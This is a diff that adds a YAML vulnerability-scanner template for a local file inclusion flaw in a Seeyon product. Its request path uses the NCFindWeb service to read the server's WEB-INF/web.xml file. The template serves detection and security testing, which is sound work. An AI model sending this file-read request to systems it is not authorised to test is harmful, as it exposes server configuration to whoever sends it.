@@ -1,0 +1,36 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - part: body
+          type: word
+          words:
+            - <servlet-name>NCInvokerServlet</servlet-name>
+        - part: header
+          type: word
+          words:
+            - application/xml
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml'
+id: wooyun-2015-148227
+info:
+    author: princechaddha
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: Seeyon WooYun allows remote attackers to include the content of locally stored content and disclose it back to the attacker via local file inclusion.
+    metadata:
+        max-request: 1
+    name: Seeyon WooYun - Local File Inclusion
+    reference:
+        - https://wooyun.x10sec.org/static/bugs/wooyun-2015-0148227.html
+    severity: high
+    tags:
+        - seeyon
+        - wooyun
+        - zhiyuan
+        - Servlet
